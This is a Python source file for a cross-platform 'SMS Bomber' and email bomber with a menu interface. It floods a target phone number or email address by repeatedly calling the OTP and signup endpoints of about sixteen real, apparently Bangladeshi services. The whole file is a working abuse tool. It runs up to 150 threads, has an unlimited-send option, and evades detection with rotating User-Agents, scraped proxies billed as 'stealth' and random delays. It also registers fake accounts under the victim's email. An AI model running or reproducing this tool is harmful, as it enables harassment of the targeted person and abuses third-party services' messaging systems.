import requests
import threading
import time
import random
import string
import os
import sys
from datetime import datetime

# Colors for terminal (Compatible with a-Shell, Termux, CMD, PowerShell)
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

# List of random User-Agents to mask device identity
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | __ )| ____|  _ \ {C}║
║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| |  _ \|  _| | |_) |{C}║
║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | |_) | |___|  _ < {C}║
║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_|____/|_____|_| \_\{C}║
║                                                              ║
║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
║ {W}           Created for: a-Shell, Termux, Windows             {C}║
║ {G}           Security: Session, Smart Retry, Log, Jitter       {C}║
╚══════════════════════════════════════════════════════════════╝
    """)

def get_random_name():
    return ''.join(random.choices(string.ascii_letters, k=8))

def get_random_email():
    return f"{get_random_name()}@gmail.com"

def get_random_phone():
    return "01" + "".join(random.choices(string.digits, k=9))

class Bomber:
    def __init__(self, target, limit, mode='sms', proxies=None):
        self.target = target
        self.limit = limit # 0 means infinite
        self.mode = mode
        self.proxies_list = proxies if proxies else []
        self.sent = 0
        self.failed = 0
        self.proxy_success = 0
        self.proxy_fail = 0
        self.running = True
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(self.log_file, "w") as f:
            f.write(f"Bombing Session Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {self.target} | Mode: {self.mode.upper()}\n")
            f.write("-" * 60 + "\n")

    def get_headers(self, extra=None):
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        if extra:
            headers.update(extra)
        return headers

    def get_proxy(self):
        if not self.proxies_list:
            return None
        proxy = random.choice(self.proxies_list)
        return {"http": proxy, "https": proxy}

    def log_event(self, api_name, success, status_code=None, used_proxy=False):
        with self.lock:
            timestamp = datetime.now().strftime("%H:%M:%S")
            status = "SUCCESS" if success else "FAILED"
            proxy_info = " [PROXY]" if used_proxy else ""
            log_entry = f"[{timestamp}] {api_name:15} | {status:7} | Code: {status_code}{proxy_info}\n"
            
            with open(self.log_file, "a") as f:
                f.write(log_entry)
            
            if success:
                self.sent += 1
                if used_proxy: self.proxy_success += 1
                color = G
                icon = "✓"
            else:
                self.failed += 1
                if used_proxy: self.proxy_fail += 1
                color = R
                icon = "✗"

            limit_str = "∞" if self.limit == 0 else str(self.limit)
            proxy_stat = f" | {B}Proxy: {self.proxy_success}/{self.proxy_fail}{W}" if self.proxies_list else ""
            
            # Full logging without clearing terminal
            print(f"{color}[{icon}] {timestamp} | {api_name:15} | {status:7} | Sent: {self.sent}/{limit_str}{proxy_stat}")

    # SMS APIs
    def api_redx(self):
        url = "https://api.redx.com.bd:443/v1/user/signup"
        data = {"name": self.target, "service": "redx", "phoneNumber": self.target}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("RedX", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("RedX", False, "Error", bool(proxy))
            return False

    def api_khaasfood(self):
        url = f"https://api.khaasfood.com/api/app/one-time-passwords/token?username={self.target}"
        proxy = self.get_proxy()
        try:
            res = self.session.get(url, headers=self.get_headers(), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("KhaasFood", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("KhaasFood", False, "Error", bool(proxy))
            return False

    def api_bioscope(self):
        url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
        data = {"number": f"+88{self.target}"}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json", "Origin": "https://www.bioscopeplus.com"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("Bioscope", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("Bioscope", False, "Error", bool(proxy))
            return False

    def api_bikroy(self):
        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={self.target}"
        proxy = self.get_proxy()
        try:
            res = self.session.get(url, headers=self.get_headers(), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("Bikroy", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("Bikroy", False, "Error", bool(proxy))
            return False

    def api_proiojon(self):
        url = "https://billing.proiojon.com/api/v1/auth/sign-up"
        data = {"name": get_random_name(), "phone": self.target, "email": get_random_email(), "password": "password123", "ref_code": ""}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("Proiojon", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("Proiojon", False, "Error", bool(proxy))
            return False

    def api_beautybooth(self):
        url = "https://admin.beautybooth.com.bd/api/v2/auth/signup"
        data = {"phone": self.target}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("BeautyBooth", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("BeautyBooth", False, "Error", bool(proxy))
            return False

    def api_robi(self):
        url = "https://webapi.robi.com.bd/v1/account/register/otp"
        data = {"phone_number": self.target}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("Robi", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("Robi", False, "Error", bool(proxy))
            return False

    def api_arogga(self):
        url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10"
        data = {"mobile": self.target, "fcmToken": "", "referral": ""}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, data=data, headers=self.get_headers(), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("Arogga", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("Arogga", False, "Error", bool(proxy))
            return False

    def api_mygp(self):
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{self.target}/"
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, headers=self.get_headers(), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("MyGP", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("MyGP", False, "Error", bool(proxy))
            return False

    def api_bdstall(self):
        url = "https://www.bdstall.com/userRegistration/save_otp_info/"
        data = {"UserTypeID": "2", "RequestType": "1", "Name": "Md", "Mobile": self.target}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, data=data, headers=self.get_headers(), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("BDStall", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("BDStall", False, "Error", bool(proxy))
            return False

    def api_shikho(self):
        url = "https://api.shikho.com/auth/v2/send/sms"
        data = {"phone": self.target, "type": "student", "auth_type": "signup", "vendor": "shikho"}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("Shikho", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("Shikho", False, "Error", bool(proxy))
            return False

    # Email APIs
    def api_bikroy_email(self):
        url = "https://bikroy.com/data/account"
        data = {"account":{"profile":{"name":get_random_name(),"opt_out":False},"login":{"email":self.target,"password":"Password123"}}}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("BikroyEmail", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("BikroyEmail", False, "Error", bool(proxy))
            return False

    def api_busbud_email(self):
        url = "https://www.busbud.com/auth/email-signup"
        data = {"first_name":"Md","last_name":"User","email":self.target,"password":"Password123","confirmed_password":"Password123","email_opt_in":False,"locale":"en"}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("BusbudEmail", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("BusbudEmail", False, "Error", bool(proxy))
            return False

    def api_saralifestyle_email(self):
        url = "https://prod.saralifestyle.com/api/Master/SendTokenV1"
        data = {"userContactNo":self.target,"userType":"customer","actionFor":"r"}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("SaraEmail", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("SaraEmail", False, "Error", bool(proxy))
            return False

    def api_tohfay_email(self):
        url = "https://www.tohfay.com/user/register.html"
        data = {"first_name": get_random_name(), "last_name": get_random_name(), "gender": "1", "email": self.target, "password": "Password123"}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, data=data, headers=self.get_headers(), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("TohfayEmail", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("TohfayEmail", False, "Error", bool(proxy))
            return False

    def api_robishop_email(self):
        url = "https://api.robishop.com.bd/api/user/create"
        data = {"customer":{"email":self.target,"firstname":get_random_name(),"lastname":get_random_name(),"custom_attributes":{"mobilenumber":get_random_phone()}},"password":"Password123"}
        proxy = self.get_proxy()
        try:
            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
            success = res.status_code == 200
            self.log_event("RobishopEmail", success, res.status_code, bool(proxy))
            return success
        except:
            self.log_event("RobishopEmail", False, "Error", bool(proxy))
            return False

    def bomb(self):
        if self.mode == 'sms':
            apis = [
                self.api_redx, self.api_khaasfood, self.api_bioscope, 
                self.api_bikroy, self.api_proiojon, self.api_beautybooth,
                self.api_robi, self.api_arogga, self.api_mygp, 
                self.api_bdstall, self.api_shikho
            ]
        else:
            apis = [
                self.api_bikroy_email, self.api_busbud_email, 
                self.api_saralifestyle_email, self.api_tohfay_email,
                self.api_robishop_email
            ]
        
        while self.running:
            if self.limit != 0 and self.sent >= self.limit:
                self.running = False
                break
                
            api = random.choice(apis)
            api()
            
            # Jitter: Random delay to mimic human behavior
            time.sleep(random.uniform(0.1, 0.5))

def scrape_proxies():
    print(f"{Y}[*] Scraping free proxies for stealth...")
    proxies = []
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxyscan.io/download?type=http"
    ]
    for url in sources:
        try:
            res = requests.get(url, timeout=10)
            if res.status_code == 200:
                found = res.text.strip().split('\n')
                proxies.extend([p.strip() for p in found if p.strip()])
        except:
            continue
    
    proxies = list(set(proxies))
    if proxies:
        print(f"{G}[✓] Found {len(proxies)} unique proxies!")
    else:
        print(f"{R}[!] Failed to scrape proxies. Continuing without them.")
    return proxies

def main():
    while True:
        clear()
        banner()
        
        try:
            print(f"{C}[1] SMS Bombing")
            print(f"{C}[2] Email Bombing")
            print(f"{C}[E] Exit Project")
            choice = input(f"\n{Y}[?] Select Mode: {W}").lower()
            
            if choice == 'e':
                print(f"{G}[✓] Thank you for using SMS Bomber!")
                break
                
            if choice == '1':
                mode = 'sms'
                target = input(f"{C}[?] Enter Target Number (e.g. 017xxxxxxxx): {W}")
                if len(target) != 11 or not target.isdigit():
                    print(f"{R}[!] Invalid Number Format!")
                    time.sleep(2)
                    continue
            elif choice == '2':
                mode = 'email'
                target = input(f"{C}[?] Enter Target Email: {W}")
                if "@" not in target:
                    print(f"{R}[!] Invalid Email Format!")
                    time.sleep(2)
                    continue
            else:
                print(f"{R}[!] Invalid Choice!")
                time.sleep(2)
                continue
                
            limit_input = input(f"{C}[?] Enter Bombing Limit (0 for Unlimited): {W}")
            limit = int(limit_input) if limit_input.isdigit() else 0
            
            threads_input = input(f"{C}[?] Enter Thread Count (Max 150): {W}")
            threads_count = min(int(threads_input), 150) if threads_input.isdigit() else 10
            
            print(f"\n{C}[1] Use Custom Proxy")
            print(f"{C}[2] Auto-Scrape Free Proxies (Stealth)")
            print(f"{C}[3] No Proxy")
            proxy_choice = input(f"\n{Y}[?] Select Proxy Mode: {W}")
            
            proxies = []
            if proxy_choice == '1':
                p = input(f"{C}[?] Enter Proxy (e.g. http://user:pass@ip:port): {W}")
                proxies = [p]
            elif proxy_choice == '2':
                proxies = scrape_proxies()
            
            print(f"\n{Y}[*] Starting {mode.upper()} Bombing on {target}...")
            print(f"{Y}[*] Press Enter to stop and return to menu.\n")
            
            bomber = Bomber(target, limit, mode, proxies)
            
            threads = []
            for _ in range(threads_count):
                t = threading.Thread(target=bomber.bomb)
                t.daemon = True
                t.start()
                threads.append(t)
                
            # Wait for Enter key to stop
            input()
            bomber.running = False
            
            print(f"\n\n{G}[✓] Bombing Stopped!")
            print(f"{G}[+] Total Sent: {bomber.sent}")
            print(f"{R}[-] Total Failed: {bomber.failed}")
            print(f"{Y}[*] Detailed log saved to: {bomber.log_file}")
            print(f"\n{C}Press Enter to return to main menu...")
            input()
            
        except KeyboardInterrupt:
            print(f"\n\n{R}[!] Use 'Enter' to stop bombing. Press 'Enter' again to exit project.")
            try:
                input()
                break
            except:
                break
        except Exception as e:
            print(f"\n{R}[!] Error: {e}")
            time.sleep(3)

if __name__ == "__main__":
    main()
